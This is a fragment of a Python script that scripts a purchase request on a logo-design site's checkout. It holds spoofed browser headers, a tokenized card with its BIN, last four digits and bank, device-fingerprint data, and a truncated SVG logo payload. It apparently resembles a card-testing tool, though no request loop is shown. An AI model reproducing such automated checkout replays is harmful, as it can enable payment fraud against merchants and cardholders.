	    '_ga_93VBC82KGM': 'GS1.2.1720435247.1.1.1720435331.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.38243407.1720435247; _gid=GA1.2.185830640.1720435247; _gat=1; _ga_93VBC82KGM=GS1.2.1720435247.1.1.1720435331.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'tier': 'basic',
	    'email': 'mero@gmail.com',
	    'payload': {
	        'nonce': tok,
	        'details': {
	            'expirationMonth': '05',
	            'expirationYear': '2025',
	            'bin': '515462',
	            'cardType': 'MasterCard',
	            'lastFour': '9421',
	            'lastTwo': '21',
	        },
	        'type': 'CreditCard',
	        'description': 'ending in 21',
	        'deviceData': '{"device_session_id":"3ad88b5dbf709578ed2836ceca2040e5","fraud_merchant_id":null,"correlation_id":"7fd2f7eef6c9659fcfc8fbe33c5a2b34"}',
	        'binData': {
	            'prepaid': 'Yes',
	            'healthcare': 'No',
	            'debit': 'Yes',
	            'durbinRegulated': 'No',
	            'commercial': 'Unknown',
	            'payroll': 'No',
	            'issuingBank': 'THE BANCORP BANK NATIONAL ASSOCIATION',
	            'countryOfIssuance': 'USA',
	            'productId': 'MPF',
	        },
	    },
	    'discount': False,
	    'referral': None,
	    'params': {
	        'id': 'logo-7326efc1-8e91-4085-82e2-e5c497ffd6a0',
	        'layout': 0,
	        'title': '^M',
	        'titleFamily': 'Brandmark Serif 1 Color',
	        'titleVariant': 'regular',
	        'titleColor': [
	            {
	                'hex': '#298779',
	                'location': 0,
	            },
	            {
	                'hex': '#a8afab',
	                'location': 1,
	            },
	        ],
	        'titleScale': 2.25,
	        'titleLetterSpace': 10,
	        'titleLineSpace': 1.1,
	        'titleBoldness': 0,
	        'titleX': 0,
	        'titleY': 0,
	        'titleAlign': 'center',
	        'slogan': '',
	        'sloganFamily': 'Coustard',
	        'sloganVariant': '400',
	        'sloganColor': [
	            {
	                'hex': '#298779',
	            },
	        ],
	        'sloganScale': 3,
	        'sloganLetterSpace': 2,
	        'sloganLineSpace': 1.1,
	        'sloganBoldness': 0,
	        'sloganAlign': 'center',
	        'sloganX': 0,
	        'sloganY': 0,
	        'icon': {
	            'type': 'custom',
	            'id': 'akronim/M',
	            'preview': 'https://app.brandmark.io/v3/custom_icons/preview/akronim/M.png',
	        },
	        'showIcon': True,
	        'iconScale': 1.3,
	        'iconColor': [
	            {
	                'hex': '#a8afab',
	            },
	        ],
	        'iconContainer': {
	            'type': 'noun',
	            'id': 967694,
	            'preview': 'https://app.brandmark.io/v3/icon_large/?id=967694',
	        },
	        'showIconContainer': True,
	        'iconContainerScale': 1,
	        'iconContainerColor': [
	            {
	                'hex': '#dcdcd5',
	            },
	        ],
	        'iconSpace': 1,
	        'iconX': 0,
	        'iconY': 0,
	        'nthChar': 0,
	        'container': None,
	        'showContainer': False,
	        'containerScale': 1,
	        'containerColor': [
	            {
	                'hex': '#dcdcd5',
	            },
	        ],
	        'containerX': 0,
	        'containerY': 0,
	        'backgroundColor': [
	            {
	                'hex': '#f6f3eb',
	            },
	        ],
	        'palette': [
	            '#f6f3eb',
	            '#298779',
	            '#539489',
	            '#7da19a',
	            '#a8afab',
	        ],
	        'keywords': [
	            'M',
	        ],
	    },
	    'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg62676" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata62682">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs62680"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-7326efc1-8e91-4085-82e2-e5c497ffd6a0">\n    <stop id="stop62657" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop62659" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-7326efc1-8e91-4085-82e2-e5c497ffd6a0">\n    <stop id="stop62662" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop62664" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop62666" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" transform="translate(0 0)" style="display: none;"></image>\n    <g id="logo-center" transform="translate(0 0)">\n      <image xlink:href="data:image/png;base64,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" id="icon_container" x="437" y="22" width="150" height="150" transform="translate(0 136.88306625) "></image>\n      <g id="slogan" style="font-style:normal;font-weight:400;font-size:32px;line-height:1;font-family:Coustard;font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)"></g>\n      <g id="title" style="font-style:normal;font-weight:normal;font-size:72px;line-height:1;font-family:\'Brandmark Serif 1 Color\';font-variant-ligatures:normal;text-align:center;text-anchor:middle" transform="translate(0 0)">\n        <g id="path62685" aria-label="^M" transform="translate(0 389.75394125) translate(244.00950875 -39.870875) scale(2.25) translate(-466.57903 71.8967)"> <path class="c1" d="M19.87061-0.00001l29.39551,62.24969l-4.57471,9.74927H38.75L9.12842,9.26988H9.12817 C6.89844,4.5479,4.72192-0.00001,0-0.00001h4.75098H8.5498h7.19995H19.87061z M9.26978,62.72911H8.5498 c0,4.72192-3.82788,9.26984-8.5498,9.26984h8.5498h0.71997h8.55005C13.09766,71.99895,9.26978,67.45103,9.26978,62.72911z M238.19751,92.30235c-0.92261,4.79761-7.3811,13.28564-22.32739,13.28564c-28.23193,0-75.16797-16.85291-90.26514-16.85291 l0.00024,0.00073c-6.7229-1.70258-15.52954-1.66302-26.50952,1.12463c14.74072-3.64728,32.97706,9.26801,32.97706,22.75555 c0,4.92487-1.06396,11.58905-16.26074,11.58905c-19.86035,0-31.34546-18.70929-31.34546-42.26831V9.26988 c0-4.72199,3.82788-9.2699,8.5498-9.2699h-8.5498H77.2666h-7.19995h-8.5498c4.72192,0,8.5498,4.54791,8.5498,9.2699v69.49054 c0,13.19391,5.50903,46.36816,45.67944,46.36816c13.77295,0,26.5083-5.33057,26.5083-17.94385 c0-6.63641-3.83398-13.14246-11.73413-16.73755c27.02295,2.3161,63.52856,25.95831,86.82617,25.95831 C233.76904,116.4055,239.67358,100.60588,238.19751,92.30235z" transform="translate(466.57903 -71.89668)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#298779" stroke="#298779"></path> </g>\n      </g>\n      <image xlink:href="data:image/png;base64,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